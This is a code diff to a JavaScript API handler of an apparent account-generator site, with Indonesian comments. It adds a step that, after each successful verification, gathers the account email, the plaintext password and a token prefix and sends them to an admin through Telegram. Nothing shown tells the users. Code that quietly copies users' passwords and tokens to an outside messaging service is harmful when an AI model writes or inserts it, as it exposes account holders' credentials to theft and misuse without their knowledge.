@@ -1,8 +1,10 @@
 // ============================================================
 // MVNF - api/am.js
-// AM JZCloud - Dhanz
+// AM JZCloud - Dhanz + NOTIF TELE
 // BASE langsung tancap, tanpa ENV
 // ============================================================
+
+import { sendAdminNotif } from "./_tele.js";
 
 export default async function handler(req, res) {
 
@@ -62,6 +64,16 @@ export default async function handler(req, res) {
 
     let data = null;
     try { data = JSON.parse(text); } catch {}
+
+    // 🔥 NOTIF TELE - CUMA PAS VERIFY BERHASIL
+    if (action === 'verify' && r.ok) {
+      const jam = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+      const accEmail = data?.data?.email || data?.email || email || '-';
+      const accPass = data?.data?.password || data?.password || data?.data?.pass || '-';
+      const accToken = data?.data?.token || data?.token || '';
+      const tokenPendek = accToken ? `\n🔑 Token: \`${String(accToken).slice(0, 30)}...\`` : '';
+      await sendAdminNotif(`🔥 *ADA YANG GENERATE!*\n\n🎬 Service: *AM*\n📧 Email: \`${accEmail}\`\n🔑 Pass: \`${accPass}\`${tokenPendek}\n🕐 Jam: ${jam}\n------------------------\nMVNF Web`);
+    }
 
     return res.status(200).json({
       success: r.ok,
